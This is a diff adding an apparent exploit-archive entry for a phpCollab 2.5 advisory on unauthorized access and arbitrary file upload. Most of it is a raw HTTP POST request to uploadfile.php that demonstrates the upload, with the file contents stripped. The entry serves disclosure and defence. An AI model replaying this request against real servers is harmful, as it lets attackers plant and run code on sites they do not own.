@@ -1,0 +1,49 @@
+source: http://www.securityfocus.com/bid/53675/info
+
+phpCollab is prone to an unauthorized-access and an arbitrary-file-upload vulnerabilities.
+
+Attackers can leverage these issues to gain unauthorized access to application data and to upload and execute arbitrary code in the context of the application.
+
+phpCollab 2.5 is vulnerable; other versions may also be affected. 
+
+POST
+/phpcollab/projects_site/uploadfile.php?PHPSESSID=f2bb0a2008d0791d1ac45a8a3
+8e51ed2&action=add&project=&task= HTTP/1.1
+Host: 192.0.0.2
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:9.0.1)
+Gecko/20100101 Firefox/9.0.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip, deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+DNT: 1
+Proxy-Connection: keep-alive
+Cookie: PHPSESSID=6cvltmkam146ncp3hfbucumfk6
+Referer: http://192.0.0.2/
+Content-Type: multipart/form-data;
+boundary=---------------------------19548990971636807826563613512
+Content-Length: 29914
+
+-----------------------------19548990971636807826563613512
+Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+100000000
+-----------------------------19548990971636807826563613512
+Content-Disposition: form-data; name="maxCustom"
+
+
+-----------------------------19548990971636807826563613512
+Content-Disposition: form-data; name="commentsField"
+
+Hello there
+-----------------------------19548990971636807826563613512
+Content-Disposition: form-data; name="upload"; filename="filename.jpg"
+Content-Type: image/jpeg
+file data stripped
+-----------------------------19548990971636807826563613512
+Content-Disposition: form-data; name="submit"
+
+Save
+-----------------------------19548990971636807826563613512--
+
+
